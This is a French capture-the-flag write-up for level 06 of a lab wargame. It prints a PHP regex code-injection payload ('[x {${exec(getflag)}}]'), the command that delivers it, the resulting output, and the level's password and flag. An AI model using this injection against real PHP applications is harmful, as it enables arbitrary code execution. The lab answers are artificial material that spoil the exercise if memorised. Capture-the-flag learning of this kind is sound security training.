# level 06

### ![#409EFF](https://via.placeholder.com/15/409EFF/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ Password`
```
viuaaale9huek52boumoomioc
```

### ![#E6A23C](https://via.placeholder.com/15/E6A23C/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ ‎‏‏‎Exploit`

On trouve un binaire et un fichier php

Le fichier php print le paramètre reçu si il est bien formaté.

En s’aidant de regex101, on comprend que le paramètre doit commencer par [x et finir par ].
Comme avant, on crée le fichier, et on l’envoie dans ./level06
```sh
echo '[x {${exec(getflag)}}]' > /tmp/wow & ./level06 /tmp/wow
```
Ce qui renvoit une erreur (initialement pas prévu, mais renvoie le flag)
```php
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
[1]+  Done                    echo '[x {${exec(getflag)}}]' > /tmp/wow
```

```cmd
su level07
```

### ![#67C23A](https://via.placeholder.com/15/67C23A/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ Flag`
```
wiok45aaoguiboiki2tuin6ub
```